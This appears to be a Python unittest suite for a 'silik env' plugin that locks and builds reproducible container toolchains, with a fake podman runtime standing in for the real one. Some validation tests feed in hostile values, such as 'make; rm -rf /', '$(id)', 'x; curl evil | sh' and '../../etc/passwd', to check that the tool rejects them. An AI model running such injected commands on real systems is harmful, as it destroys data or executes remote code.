# Tests of `silik env` (packages/silik-tools/files/plugins/env.py, docs/ENV.md): a project's tools pinned by one file
# and one lock. No podman, dnf or network needed: the container runtime is a stand-in program that records what it is
# asked and answers with what a real run answered (tests/env/fw: the resolver's own answer, the lock made from it and
# the package list of the image built from that lock, recorded on 13/11/2026 with the real repositories).
# The same on a real runtime, with the real repositories: SILIK_ENV_REAL=1 python3 -m unittest tests.test_env
#   python3 -m unittest discover -s tests -v
import argparse
import configparser
import contextlib
import io
import json
import os
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

from test_silik import ROOT, silik

FW = os.path.join(ROOT, "tests/env/fw")
PLUGIN = os.path.join(ROOT, "packages/silik-tools/files/plugins/env.py")
DIGEST = "sha256:245f8aab832fe800aa42bdab5fad75ebbd8e0b4c9f24820a83c638b177857ae2"
REF = "docker.io/library/almalinux@" + DIGEST

sys.modules.setdefault(silik.__name__, silik)        # (silik hands itself to a plugin's register(): it looks itself up by name)
env = silik.load_plugin("env")
env.register(argparse.ArgumentParser(), silik)

def cat(path, mode="r"):
    with open(path, mode) as f:
        return f.read()


def put(path, text):
    with open(path, "w") as f:
        f.write(text)


# the stand-in for podman / docker: every call is written down, the answers come from files of $FAKE_DIR
FAKE = r'''#!/usr/bin/env python3
import json, os, re, sys
a, d = sys.argv[1:], os.environ["FAKE_DIR"]
with open(os.path.join(d, "calls"), "a") as f:
    f.write(json.dumps(a) + "\n")
def state():
    try:
        return json.load(open(os.path.join(d, "state")))
    except (OSError, ValueError):
        return {}
def save(st):
    json.dump(st, open(os.path.join(d, "state"), "w"))
def text(name):
    try:
        return open(os.path.join(d, name)).read()
    except OSError:
        return ""
st = state()
if a == ["--version"]:
    print(st.get("version", "podman version 5.4.0"))
elif a[:2] == ["image", "inspect"]:
    fmt, img = a[3], a[4]
    if "RepoDigests" in fmt:
        if img not in st.get("digests", {}):
            sys.exit(1)
        print(json.dumps(st["digests"][img]))
    elif fmt == "{{.Digest}}":
        print(st.get("own", ""))
    else:
        if img not in st.get("labels", {}):
            sys.exit(1)
        print(st["labels"][img])
elif a[0] == "pull":
    st.setdefault("digests", {})[a[1]] = st["registry"]
    save(st)
elif a[0] == "build":
    sys.stdin.close()
    cf = open(a[a.index("-f") + 1]).read()
    open(os.path.join(d, "Containerfile"), "w").write(cf)
    sys.stdout.write(st.get("build_out", ""))
    if st.get("build_rc"):
        sys.exit(st["build_rc"])
    st.setdefault("labels", {})[a[a.index("-t") + 1]] = re.search(r'silik.env.image="([0-9a-f]+)"', cf).group(1)
    save(st)
elif a[0] == "run":
    if a[-3:-1] == ["python3", "-"]:
        open(os.path.join(d, "resolver"), "w").write(sys.stdin.read())
        sys.stdout.write(text("resolved"))
        sys.exit(st.get("resolve_rc", 0))
    if "-qa" in a:
        sys.stdout.write(text("rpmqa"))
    elif a[-2:] == ["--format", "freeze"]:
        sys.stdout.write(text("piplist"))
    elif "pip download" in a[-1]:
        sys.stdout.write(text("pipdl"))
    elif a[-2] == "-c" and a[-1] in st.get("out", {}):
        sys.stdout.write(st["out"][a[-1]])
    sys.exit(st.get("run_rc", 0))
'''



# the recorded resolution and lock are an x86_64 machine's, and a lock of another architecture is refused: these tests
# are that machine's, whatever runs them (they failed on GitHub's aarch64 runner, run 43405299386)
def setUpModule():
    global _ARCH_WAS
    _ARCH_WAS = os.environ.get("SILIK_ARCH")
    os.environ["SILIK_ARCH"] = "x86_64"


def tearDownModule():
    if _ARCH_WAS is None:
        os.environ.pop("SILIK_ARCH", None)
    else:
        os.environ["SILIK_ARCH"] = _ARCH_WAS


class Case(unittest.TestCase):
    """a project folder, the stand-in runtime, silik's state and cache in a temporary folder"""

    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.d)
        self.proj = os.path.join(self.d, "fw")
        os.mkdir(self.proj)
        self.fake = os.path.join(self.d, "fake")
        os.mkdir(self.fake)
        exe = os.path.join(self.fake, "runtime")
        with open(exe, "w") as f:
            f.write(FAKE)
        os.chmod(exe, 0o755)
        p = mock.patch.dict(os.environ, {"SILIK_ENV_RUNNER": exe, "FAKE_DIR": self.fake, "XDG_CACHE_HOME": os.path.join(self.d, "cache"),
                                         "SILIK_LANG": "en"})
        p.start()
        self.addCleanup(p.stop)
        for k in ("SILIK_ENV_CA",) + env.PROXY:
            os.environ.pop(k, None)
        p = mock.patch.object(silik, "STATE", os.path.join(self.d, "state"))
        p.start()
        self.addCleanup(p.stop)
        self.state(digests={"docker.io/library/almalinux:9": ["almalinux@" + DIGEST]})
        shutil.copy(os.path.join(FW, "silik.env"), self.proj)
        shutil.copy(os.path.join(FW, "resolved.txt"), os.path.join(self.fake, "resolved"))
        shutil.copy(os.path.join(FW, "rpmqa.txt"), os.path.join(self.fake, "rpmqa"))

    def state(self, **kv):
        path = os.path.join(self.fake, "state")
        st = json.loads(cat(path)) if os.path.exists(path) else {}
        st.update(kv)
        put(path, json.dumps(st))

    def calls(self, clear=True):
        path = os.path.join(self.fake, "calls")
        out = [json.loads(l) for l in cat(path).splitlines()] if os.path.exists(path) else []
        if clear and os.path.exists(path):
            os.remove(path)
        return out

    def silik(self, *argv, cwd=None):
        out, err, rc = io.StringIO(), io.StringIO(), None
        old = os.getcwd()
        os.chdir(cwd or self.proj)
        try:
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                try:
                    rc = silik.main(list(argv))
                except SystemExit as e:
                    rc = e.code
        finally:
            os.chdir(old)
        return rc, out.getvalue(), err.getvalue()

    def write(self, text, name="silik.env"):
        with open(os.path.join(self.proj, name), "w") as f:
            f.write(text)

    def lock(self):
        with open(os.path.join(self.proj, "silik.env.lock")) as f:
            return json.load(f)

    def relock(self, change):
        """the lock changed as `silik env lock` would have written it (its image hash made again)"""
        lock = self.lock()
        change(lock)
        lock["image"] = env.image_key(lock)
        self.write(json.dumps(lock, indent=1, sort_keys=True) + "\n", "silik.env.lock")
        return lock


class File(Case):
    def spec(self, text):
        self.write(text)
        return env.read_env(self.proj)

    def dies(self, text, word):
        self.write(text)
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as e:
            env.read_env(self.proj)
        self.assertEqual(e.exception.code, 2)
        self.assertIn(word, err.getvalue())

    def test_the_smallest_file(self):
        s = self.spec("[packages]\nmake\n")
        self.assertEqual((s["name"], s["base"]), ("fw", "docker.io/library/almalinux:9"))
        self.assertEqual(s["specs"], [{"name": "make", "want": "", "repo": ""}])
        # the base's own signed repositories, live, and no EPEL unless asked
        self.assertEqual([r["id"] for r in s["repos"]], ["baseos", "appstream", "extras"])
        self.assertEqual(s["repos"][0]["baseurl"], "https://repo.almalinux.org/almalinux/$releasever/BaseOS/$basearch/os/")
        self.assertTrue(all(r["gpgkey"] and not r["frozen"] for r in s["repos"]))
        self.assertEqual(s["devices"], {"usb": False, "serial": False, "display": False})

    def test_versions_repositories_and_the_rest(self):
        s = self.spec("[env]\nname = Board-A\nbuild = make all\n[repos]\nsnapshot = https://vault.almalinux.org/9.6/\n"
                      "epel = https://dl.fedoraproject.org/pub/archive/epel/9.6\nmine = https://example.org/el9/\nmine.gpgkey = https://example.org/KEY\n"
                      "[packages]\ncmake = 3.26.5\ngcc = 11.5.0-5.el9_5\nmake\n[environment]\nCFLAGS = -O2 -g\n[devices]\nusb = yes\n"
                      "[mounts]\n/opt/vendor = ro\n[versions]\ntool = cat /opt/vendor/VERSION\n")
        self.assertEqual(s["name"], "board-a")                  # (an image's name is lower case)
        self.assertEqual([(x["name"], x["want"]) for x in s["specs"]], [("cmake", "3.26.5"), ("gcc", "11.5.0-5.el9_5"), ("make", "")])
        ids = {r["id"]: r for r in s["repos"]}
        self.assertEqual(sorted(ids), ["appstream", "baseos", "crb", "epel", "extras", "mine"])        # (CRB comes with EPEL)
        self.assertEqual(ids["baseos"]["baseurl"], "https://vault.almalinux.org/9.6/BaseOS/$basearch/os/")
        self.assertEqual(ids["epel"]["baseurl"], "https://dl.fedoraproject.org/pub/archive/epel/9.6/Everything/$basearch/")
        self.assertTrue(all(r["frozen"] for r in s["repos"]))
        self.assertEqual(ids["mine"]["gpgkey"], "https://example.org/KEY")
        self.assertEqual((s["environment"], s["mounts"], s["versions"], s["devices"]["usb"], s["build"]),
                         ({"CFLAGS": "-O2 -g"}, ["/opt/vendor"], {"tool": "cat /opt/vendor/VERSION"}, True, "make all"))

    def test_the_example_of_the_doc_is_a_file_it_reads(self):
        doc = cat(os.path.join(ROOT, "docs/ENV.md"))
        s = self.spec(doc.split("```ini\n", 1)[1].split("```", 1)[0])
        self.assertEqual([(x["name"], x["want"], x["repo"]) for x in s["specs"]],
                         [("cmake", "", ""), ("make", "4.3", ""), ("gcc", "11.5.0-5.el9_5", ""), ("openocd", "0.12.0", "silikos")])
        self.assertEqual((s["build"], s["pip"], s["mounts"], s["devices"]),
                         ("cmake -B build && cmake --build build", "requirements.txt", ["/opt/vendor"], {"usb": True, "serial": True, "display": True}))
        self.assertEqual([r["id"] for r in s["repos"]], ["baseos", "appstream", "crb", "extras", "epel", "silikos"])

    def test_another_base_names_its_own_repositories(self):
        s = self.spec("[env]\nbase = docker.io/rockylinux/rockylinux:9\n[repos]\nsnapshot = none\nepel = no\n"
                      "baseos-rocky = https://dl.rockylinux.org/vault/rocky/9.5/BaseOS/$basearch/os/\n[packages]\nmake\n")
        self.assertEqual([(r["id"], r["baseurl"], r["frozen"]) for r in s["repos"]],
                         [("baseos-rocky", "https://dl.rockylinux.org/vault/rocky/9.5/BaseOS/$basearch/os/", True)])

    def test_what_it_does_not_know_is_not_skipped(self):
        self.dies("[package]\nmake\n", "[package] is not a section")
        self.dies("[env]\nimage = x\n[packages]\nmake\n", "[env] image")
        self.dies("[packages]\nmake; rm -rf /\n", "a package's name")
        self.dies("[packages]\nmake = $(id)\n", "a package's name")
        self.dies("[packages]\nmake\n[mounts]\n/opt/x = rw\n", "read-only")
        self.dies("[packages]\nmake\n[devices]\ncan = yes\n", "[devices] can")
        self.dies("[packages]\nmake\n[repos]\nepel = maybe\n", "yes or no")
        self.dies("[packages]\nmake\n[repos]\nbaseos = https://example.org/\n", "not one of the base's")
        self.dies("[packages]\nmake\n[repos]\nmine = ftp://example.org/x\n", "is not a URL")
        self.dies("[env]\nbase = almalinux@sha256:%s\n[packages]\nmake\n" % ("0" * 64), "the lock pins the digest")
        self.dies("[env]\nname = a b\n[packages]\nmake\n", "letters, digits")
        self.dies("[env]\nbuild = make\n  rm -rf x\n[packages]\nmake\n", "one line")
        self.dies("[repos]\nepel = yes\n", "no package")
        self.dies("[packages]\nmake\nmake\n", "already exists")
        # SilikOS's own packages are in neither the base's repositories nor EPEL: where they are has to be said
        self.dies("[packages]\nmake\n[silikos]\nopenocd = 0.12.0\n", "silikos = URL")

    def test_a_folder_of_this_machine_as_a_repository(self):
        s = self.spec("[repos]\nsilikos = rpms\n[packages]\nmake\n[silikos]\nopenocd = 0.12.0\n")
        r = [r for r in s["repos"] if r["id"] == "silikos"][0]
        self.assertEqual((r["baseurl"], r["local"], r["gpgkey"]), ("file:///run/silik-env-repo/silikos/", os.path.join(self.proj, "rpms"), ""))
        self.assertEqual(s["specs"][-1], {"name": "openocd", "want": "0.12.0", "repo": "silikos"})
        rc, _, err = self.silik("env", "lock")             # (a folder of RPMs is not a repository yet)
        self.assertEqual(rc, 2)
        self.assertIn("createrepo_c", err)

    def test_the_project_is_found_from_a_folder_inside_it(self):
        sub = os.path.join(self.proj, "src", "drivers")
        os.makedirs(sub)
        self.assertEqual(env.root_of(argparse.Namespace(dir=None)) if os.chdir(sub) is None else None, self.proj)
        os.chdir(ROOT)
        rc, _, err = self.silik("env", "lock", cwd=self.d)
        self.assertEqual(rc, 2)
        self.assertIn("silik env init", err)


class Lock(Case):
    def test_the_lock_is_the_one_the_real_run_wrote(self):
        rc, out, err = self.silik("env", "lock")
        self.assertEqual(rc, 0, err)
        with open(os.path.join(self.proj, "silik.env.lock")) as f, open(os.path.join(FW, "silik.env.lock")) as g:
            made = f.read()
            self.assertEqual(made, g.read())
        lock = json.loads(made)
        self.assertEqual(made, json.dumps(lock, indent=1, sort_keys=True, ensure_ascii=False) + "\n")       # (sorted: it diffs)
        # the base image by digest
        self.assertEqual(lock["base"]["ref"], REF)
        self.assertEqual((lock["base"]["os"], lock["base"]["version"], lock["arch"]), ("AlmaLinux release 9.8 (Olive Jaguar)", "9.8", "x86_64"))
        self.assertEqual(len(lock["base"]["packages"]), 158)
        # every package to install: a full NEVRA, its repository, the sha256 the repository's metadata gives
        self.assertEqual(len(lock["packages"]), 13)
        ids = [r["id"] for r in lock["repos"]]
        for p in lock["packages"]:
            self.assertRegex(p["nevra"], r"^%s-(\d+:)?%s-%s\.%s$" % tuple(re.escape(p[k]) for k in ("name", "version", "release", "arch")))
            self.assertRegex(p["sha256"], r"^[0-9a-f]{64}$")
            self.assertIn(p["repo"], ids)
            self.assertTrue(p["location"].endswith(".rpm") and p["license"] and p["sourcerpm"])
        self.assertEqual([p["nevra"] for p in lock["packages"]], sorted(p["nevra"] for p in lock["packages"]))
        gcc = [p for p in lock["packages"] if p["name"] == "gcc-arm-linux-gnu"][0]
        self.assertEqual((gcc["nevra"], gcc["repo"]), ("gcc-arm-linux-gnu-12.1.1-1.el9.x86_64", "epel"))
        self.assertEqual(lock["requested"], {"cmake": "", "gcc-arm-linux-gnu": "", "make": ""})
        # the keys the packages are signed with are pinned too, and the lock's own inputs
        self.assertTrue(all(re.fullmatch(r"[0-9a-f]{64}", r["gpgkey_sha256"]) for r in lock["repos"]))
        self.assertEqual(lock["inputs"], {"silik.env": env.sha256(cat(os.path.join(self.proj, "silik.env"), "rb"))})
        # SOURCE_DATE_EPOCH: the newest build date among the packages, so a function of the lock alone
        res = json.loads(cat(os.path.join(FW, "resolved.txt"))[len(env.MARK):])
        newest = max([p["buildtime"] for p in res["packages"]] + [res["base_buildtime"]])
        self.assertEqual(lock["environment"], {"LANG": "C.UTF-8", "TZ": "UTC", "SOURCE_DATE_EPOCH": str(newest)})
        self.assertEqual(lock["image"], env.image_key(lock))
        self.assertIn("13 to install on the base's 158 (3 asked for)", out)
        self.assertIn("gcc-arm-linux-gnu            12.1.1-1.el9  epel", out)
        self.assertIn("frozen trees", out)

    def test_it_asks_dnf_in_a_throw_away_container_of_the_base_by_digest_and_says_so(self):
        rc, out, err = self.silik("env", "lock")
        self.assertEqual(rc, 0, err)
        run = [c for c in self.calls() if c[0] == "run"]
        self.assertEqual(len(run), 1)
        self.assertEqual(run[0][:5] + run[0][-4:-1], ["run", "--rm", "-i", "--network", "host", REF, "python3", "-"])
        req = json.loads(run[0][-1])
        self.assertEqual([s["name"] for s in req["specs"]], ["cmake", "make", "gcc-arm-linux-gnu"])
        self.assertEqual(len(req["repos"]), 5)
        # what the container ran is dnf's own resolver, with weak dependencies off; it installs nothing
        with open(os.path.join(self.fake, "resolver")) as f:
            script = f.read()
        self.assertEqual(script, env.RESOLVER)
        compile(script, "resolver", "exec")
        self.assertIn("install_weak_deps", script)
        self.assertNotIn("do_transaction", script)
        # said before it is done: which hosts, and the command
        self.assertLess(out.index("asking dl.fedoraproject.org, repo.almalinux.org"), out.index("$ " + os.environ["SILIK_ENV_RUNNER"] + " run --rm -i --network host"))

    def test_locked_twice_the_file_is_the_same(self):
        self.silik("env", "lock")
        path = os.path.join(self.proj, "silik.env.lock")
        first, when = cat(path), os.stat(path).st_mtime_ns
        rc, out, _ = self.silik("env", "lock")
        self.assertEqual((rc, cat(path), os.stat(path).st_mtime_ns), (0, first, when))
        self.assertIn("unchanged", out)

    def test_dry_run_prints_the_commands_and_writes_nothing(self):
        rc, out, _ = self.silik("--dry-run", "env", "lock")
        self.assertEqual(rc, 0)
        self.assertIn(" run --rm -i --network host", out)
        self.assertFalse(os.path.exists(os.path.join(self.proj, "silik.env.lock")))
        self.assertEqual([c for c in self.calls() if c[0] in ("run", "pull", "build")], [])

    def test_the_base_is_pulled_when_it_is_not_here_or_when_asked(self):
        other = "sha256:" + "ab" * 32
        self.state(digests={}, registry=["almalinux@" + other])
        rc, _, err = self.silik("env", "lock", "--json")
        self.assertEqual(rc, 0, err)
        self.assertIn(["pull", "docker.io/library/almalinux:9"], self.calls())
        self.assertEqual(self.lock()["base"]["ref"], "docker.io/library/almalinux@" + other)
        self.silik("env", "lock")
        self.assertNotIn("pull", [c[0] for c in self.calls()])              # (the local image's digest: no network for it)
        self.state(registry=["almalinux@" + DIGEST])
        self.silik("env", "lock", "--pull")
        self.assertIn("pull", [c[0] for c in self.calls()])
        self.assertEqual(self.lock()["base"]["ref"], REF)

    def test_of_two_digests_the_image_s_own_is_taken(self):
        other = "sha256:" + "00" * 32            # (sorts first: podman lists the manifest list's digest and the architecture's)
        self.state(digests={"docker.io/library/almalinux:9": ["docker.io/library/almalinux@" + other, "docker.io/library/almalinux@" + DIGEST]}, own=DIGEST)
        self.silik("env", "lock")
        self.assertEqual(self.lock()["base"]["ref"], REF)

    def answer(self, change):
        res = json.loads(cat(os.path.join(FW, "resolved.txt"))[len(env.MARK):])
        change(res)
        with open(os.path.join(self.fake, "resolved"), "w") as f:
            f.write("noise of dnf\n" + env.MARK + json.dumps(res) + "\n")

    def test_a_package_that_is_not_there_writes_no_lock_and_says_what_is(self):
        self.answer(lambda r: r.update(missing=[{"name": "cmake", "want": "3.26.5", "repo": "", "have": ["3.31.8-3.el9 (appstream)"]},
                                                {"name": "openocd", "want": "", "repo": "", "have": []},
                                                {"name": "nothing", "want": "", "repo": "", "have": []}]))
        rc, _, err = self.silik("env", "lock")
        self.assertEqual(rc, 1)
        self.assertIn("cmake: no 3.26.5; the repositories have 3.31.8-3.el9 (appstream)", err)
        self.assertIn("openocd: no package of that name (one of SilikOS's own packages", err)
        self.assertIn("nothing: no package of that name", err)
        self.assertIn("3 of its packages cannot be resolved: nothing was written", err)
        self.assertFalse(os.path.exists(os.path.join(self.proj, "silik.env.lock")))

    def test_what_dnf_cannot_do_is_said(self):
        for change, word in ((lambda r: r.update(problem="package a requires b, but none of the providers can be installed"), "cannot resolve these packages together"),
                             (lambda r: r.update(error="RepoError: Failed to download metadata for repo 'baseos'"), "could not be read: RepoError"),
                             (lambda r: r["packages"][0].update(checksum="sha512"), "another checksum than sha256"),
                             (lambda r: r["packages"][0].update(nevra="x; curl evil | sh"), "is not what a lock holds"),
                             (lambda r: r["packages"][0].update(location="../../etc/passwd"), "is not what a lock holds"),
                             (lambda r: r["keys"].update(epel="zz"), "is not what a lock holds")):
            self.answer(change)
            rc, _, err = self.silik("env", "lock")
            self.assertIn(rc, (1, 2), word)
            self.assertIn(word, err)
            self.assertFalse(os.path.exists(os.path.join(self.proj, "silik.env.lock")), word)
        self.state(resolve_rc=125)
        rc, _, err = self.silik("env", "lock")
        self.assertEqual(rc, 1)
        self.assertIn("did not answer (exit 125)", err)

    def test_live_repositories_are_said_to_drop_old_builds_with_the_frozen_trees_of_this_base(self):
        self.write("[repos]\nepel = yes\n[packages]\ncmake\nmake\ngcc-arm-linux-gnu\n")
        rc, out, err = self.silik("env", "lock")
        self.assertEqual(rc, 0, err)
        self.assertEqual({r["id"]: r["frozen"] for r in self.lock()["repos"]}, dict.fromkeys(("baseos", "appstream", "crb", "extras", "epel"), False))
        self.assertIn("live repositories: old builds leave them", out)
        self.assertIn("snapshot = https://vault.almalinux.org/9.8", out)
        self.assertIn("epel = https://dl.fedoraproject.org/pub/archive/epel/9.8", out)
        for lang, word in (("ca", "repositoris vius"), ("es", "repositorios vivos")):
            with mock.patch.dict(os.environ, {"SILIK_LANG": lang}):
                self.assertIn(word, self.silik("env", "lock")[1])

    def test_a_base_that_is_not_almalinux_needs_its_repositories_named(self):
        self.write("[packages]\nmake\n")
        self.answer(lambda r: r.update(id="rocky"))
        rc, _, err = self.silik("env", "lock")
        self.assertEqual(rc, 2)
        self.assertIn("not AlmaLinux", err)

    def test_the_site_s_proxy_and_ca_reach_the_container_and_never_the_lock(self):
        ca = os.path.join(self.d, "ca.crt")
        put(ca, "-----BEGIN CERTIFICATE-----\n")
        with mock.patch.dict(os.environ, {"https_proxy": "http://me:secret@proxy:3128", "SILIK_ENV_CA": ca}):
            rc, out, err = self.silik("env", "lock")
        self.assertEqual(rc, 0, err)
        run = [c for c in self.calls() if c[0] == "run"][0]
        self.assertIn("https_proxy", run)                        # (by name: the value, which can hold a password, is not printed)
        self.assertIn(ca + ":/run/secrets/silik-ca:ro", run)
        self.assertNotIn("secret@", out + cat(os.path.join(self.proj, "silik.env.lock")))
        self.assertEqual(cat(os.path.join(self.proj, "silik.env.lock")), cat(os.path.join(FW, "silik.env.lock")))
        with mock.patch.dict(os.environ, {"SILIK_ENV_CA": "/nonexistent/ca"}):
            self.assertEqual(self.silik("env", "lock")[0], 2)

    def test_versions_of_what_is_outside_rpm_are_recorded_by_the_user_s_command(self):
        self.write(cat(os.path.join(self.proj, "silik.env")) + "[mounts]\n/opt/vendor = ro\n[versions]\ntool = cat /opt/vendor/VERSION\n")
        self.state(out={"cat /opt/vendor/VERSION 2>&1": "tool  2024.1\nbuild 77\n"})
        rc, out, err = self.silik("env", "lock")
        self.assertEqual(rc, 0, err)
        lock = self.lock()
        self.assertEqual(lock["versions"], {"tool": {"command": "cat /opt/vendor/VERSION", "output": "tool 2024.1 build 77"}})
        self.assertEqual(lock["mounts"], ["/opt/vendor"])
        ask = [c for c in self.calls() if c[0] == "run"][-1]
        self.assertEqual(ask, ["run", "--rm", "--network", "none", "-v", "/opt/vendor:/opt/vendor:ro", REF, "sh", "-c", "cat /opt/vendor/VERSION 2>&1"])
        self.state(run_rc=3)
        rc, _, err = self.silik("env", "lock")
        self.assertEqual(rc, 1)
        self.assertIn("[versions] tool: its command failed", err)

    def test_python_packages_only_when_the_file_asks_and_then_with_hashes(self):
        self.assertEqual(json.loads(cat(os.path.join(FW, "silik.env.lock")))["pip"], [])
        self.write(cat(os.path.join(self.proj, "silik.env")) + "[pip]\nrequirements = requirements.txt\n")
        self.write("intelhex==2.3.0\n", "requirements.txt")
        rc, _, err = self.silik("env", "lock")
        self.assertEqual(rc, 2)
        self.assertIn("add python3-pip to [packages]", err)
        self.calls()
        res = json.loads(cat(os.path.join(FW, "resolved.txt"))[len(env.MARK):])
        pip = dict(res["packages"][0], name="python3-pip", nevra="python3-pip-21.3.1-2.el9_8.noarch", version="21.3.1", release="2.el9_8", arch="noarch",
                   location="Packages/python3-pip-21.3.1-2.el9_8.noarch.rpm")
        self.answer(lambda r: r["packages"].append(pip))
        h = "87cc5225657524ec6361354be928adfd56bcf2a3dcc646c40f8f094c39c07db4"
        put(os.path.join(self.fake, "pipdl"), "%s  intelhex-2.3.0-py2.py3-none-any.whl\n%s  PyYAML-6.0.1.tar.gz\n" % (h, "1" * 64))
        rc, out, err = self.silik("env", "lock")
        self.assertEqual(rc, 0, err)
        lock = self.lock()
        self.assertEqual([(p["name"], p["version"], p["sha256"]) for p in lock["pip"]], [("intelhex", "2.3.0", h), ("PyYAML", "6.0.1", "1" * 64)])
        self.assertEqual(sorted(lock["inputs"]), ["requirements.txt", "silik.env"])
        # pip itself resolved them, in the image of the lock's rpm part (its Python, its pip): built for that
        calls = self.calls()
        self.assertEqual([c[0] for c in calls if c[0] in ("build", "run")], ["run", "build", "run"])
        self.assertIn("pip download", calls[-1][-1])
        cf = env.containerfile(lock)
        self.assertIn("'intelhex==2.3.0 --hash=sha256:%s'" % h, cf)
        self.assertIn("pip install --disable-pip-version-check --no-cache-dir --no-deps --require-hashes", cf)
        self.assertNotEqual(lock["image"], env.image_key(dict(lock, pip=[])))


class Build(Case):
    def setUp(self):
        super().setUp()
        shutil.copy(os.path.join(FW, "silik.env.lock"), self.proj)

    def recipe(self, lock=None):
        return env.containerfile(lock or env.read_lock(self.proj))

    def test_the_image_is_built_exactly_from_the_lock(self):
        rc, out, err = self.silik("env", "build")
        self.assertEqual(rc, 0, err)
        lock = self.lock()
        build = [c for c in self.calls() if c[0] == "build"]
        self.assertEqual(len(build), 1)
        tag = "localhost/silik-env/fw:" + lock["image"][:12]
        self.assertEqual(build[0][:6], ["build", "--network", "host", "-t", tag, "-f"])
        cf = cat(os.path.join(self.fake, "Containerfile"))
        self.assertEqual(cf, self.recipe())
        lines = cf.split("\n")
        self.assertEqual(lines[1], "FROM " + REF)                                   # the base by digest, not by tag
        self.assertEqual(lines[2], 'LABEL silik.env.image="%s" silik.env.name="fw"' % lock["image"])
        # every package by its full NEVRA, weak dependencies off
        for p in lock["packages"]:
            self.assertIn(" " + p["nevra"] + " ", cf.replace("\n", " "))
            self.assertIn("'%s  %s'" % (p["sha256"], os.path.basename(p["location"])), cf)
        self.assertEqual(cf.count("--setopt=install_weak_deps=False"), 2)
        # the sha256 of every file is compared with the lock's BEFORE anything is installed; then dnf verifies the signatures
        down, sums, inst = cf.index("--downloadonly --destdir=$d/rpms install $(cat $d/nevras)"), cf.index("sha256sum -c --quiet $d/sha256"), cf.index("install $d/rpms/*.rpm")
        self.assertTrue(down < sums < inst)
        self.assertIn('[ "$(ls | wc -l)" = 13 ]', cf)                               # (and no file the lock does not name)
        self.assertIn("--disablerepo='*' --setopt=install_weak_deps=False --setopt=localpkg_gpgcheck=1 install $d/rpms/*.rpm", cf)
        # the keys are the ones the lock was made with
        for r in lock["repos"]:
            self.assertIn(r["gpgkey_sha256"], cf)
        self.assertEqual(cf.count("rpm --import"), 2)                                # (AlmaLinux's, in the base image; EPEL's)
        # the image's own repo files are not touched, and nothing of the build stays
        self.assertIn("--setopt=reposdir=$d/repos", cf)
        self.assertNotIn("/etc/yum.repos.d", cf)
        self.assertTrue(lines[-2].endswith("rm -rf $d /var/cache/dnf"))
        self.assertNotIn("ENV ", cf)                                                # (the environment is given when a command runs)

    def test_built_once_for_a_lock(self):
        self.silik("env", "build")
        self.calls()
        rc, out, _ = self.silik("env", "build")
        self.assertEqual(rc, 0)
        self.assertIn("already built", out)
        self.assertNotIn("build", [c[0] for c in self.calls()])
        rc, out, _ = self.silik("--dry-run", "env", "build")                        # (and --dry-run does not say it would)
        self.assertNotIn(" build ", out)
        self.silik("env", "build", "--force")
        self.assertEqual([c[:2] for c in self.calls() if c[0] == "build"], [["build", "--no-cache"]])
        # another lock, another image
        lock = self.relock(lambda l: l["packages"].pop())
        self.silik("env", "build")
        self.assertEqual([c[4] for c in self.calls() if c[0] == "build"], ["localhost/silik-env/fw:" + lock["image"][:12]])

    def test_dry_run_builds_nothing(self):
        rc, out, _ = self.silik("--dry-run", "env", "build")
        self.assertEqual(rc, 0)
        self.assertIn(" build --network host -t localhost/silik-env/fw:", out)
        self.assertNotIn("build", [c[0] for c in self.calls()])
        self.assertFalse(os.path.exists(os.path.join(self.d, "cache")))

    def test_a_package_that_is_gone_fails_loudly_with_the_frozen_trees(self):
        lock = self.relock(lambda l: [r.update(frozen=False) for r in l["repos"]])
        cf = self.recipe()
        self.assertIn("|| { echo 'silik env: dnf did not find every package of the lock", cf)
        self.assertIn("live repositories (baseos, appstream, crb, extras, epel), which drop old builds", cf)
        self.assertIn("snapshot = https://vault.almalinux.org/9.8; epel = https://dl.fedoraproject.org/pub/archive/epel/9.8", cf)
        self.state(build_rc=1, build_out="#5 12.1 No match for argument: tio-3.7-1.el9.x86_64\n#5 12.2 Error: Unable to find a match: tio-3.7-1.el9.x86_64\n"
                   "#5 12.3 silik env: dnf did not find every package of the lock (it names them above).\n#5 ERROR: process \"/bin/sh -c set -eu; ... || { echo 'silik env: dnf did not find' >&2; exit 1; }\"\n")
        rc, out, err = self.silik("env", "build")
        self.assertEqual(rc, 1)
        self.assertIn("silik: No match for argument: tio-3.7-1.el9.x86_64", err)
        self.assertIn("silik: silik env: dnf did not find every package of the lock", err)
        self.assertEqual(err.count("silik env: dnf did not find"), 1)                # (not the recipe the build prints again)
        self.assertIn("the image was not built", err)
        self.assertEqual(self.silik("env", "check")[0], 1)                           # (and nothing passes for built)

    def test_a_lock_changed_by_hand_is_not_built(self):
        lock = self.lock()
        lock["packages"][0]["sha256"] = "0" * 64
        self.write(json.dumps(lock, indent=1, sort_keys=True) + "\n", "silik.env.lock")
        for cmd in (["build"], ["run", "--", "make"], ["check"], ["export", "--ci", "github"]):
            rc, _, err = self.silik("env", *cmd)
            self.assertEqual(rc, 2, cmd)
            self.assertIn("changed by hand", err)
        self.assertEqual([c for c in self.calls() if c[0] in ("build", "run")], [])
        for change, word in ((lambda l: l["packages"][0].update(nevra="a b"), "a package's name"), (lambda l: l["base"].update(ref="almalinux:9"), "base.ref"),
                             (lambda l: l["repos"][0].update(baseurl="https://x/ y"), "the baseurl of baseos"), (lambda l: l.update(mounts=["/opt:/etc"]), "a mount")):
            shutil.copy(os.path.join(FW, "silik.env.lock"), self.proj)
            self.relock(change)
            rc, _, err = self.silik("env", "build")
            self.assertEqual(rc, 2, word)
            self.assertIn(word, err)

    def test_the_data_of_the_recipe_is_the_lock_s_when_a_shell_runs_it(self):
        lock = env.read_lock(self.proj)
        work = os.path.join(self.d, "inside")
        script = "set -eu\nd=%s\n" % work + "\n".join(env.data_lines(lock)) + "\n"
        subprocess.run(["sh", "-c", script], check=True)
        self.assertEqual(cat(os.path.join(work, "nevras")).split(), [p["nevra"] for p in lock["packages"]])
        self.assertEqual(cat(os.path.join(work, "sha256")).splitlines(), ["%s  %s" % (p["sha256"], os.path.basename(p["location"])) for p in lock["packages"]])
        cp = configparser.ConfigParser(interpolation=None)
        cp.read(os.path.join(work, "repos", "silik-env.repo"))
        self.assertEqual(cp.sections(), [r["id"] for r in lock["repos"]])
        self.assertEqual(cp["epel"]["baseurl"], "https://dl.fedoraproject.org/pub/archive/epel/9.8/Everything/$basearch/")      # ($basearch is dnf's to fill)
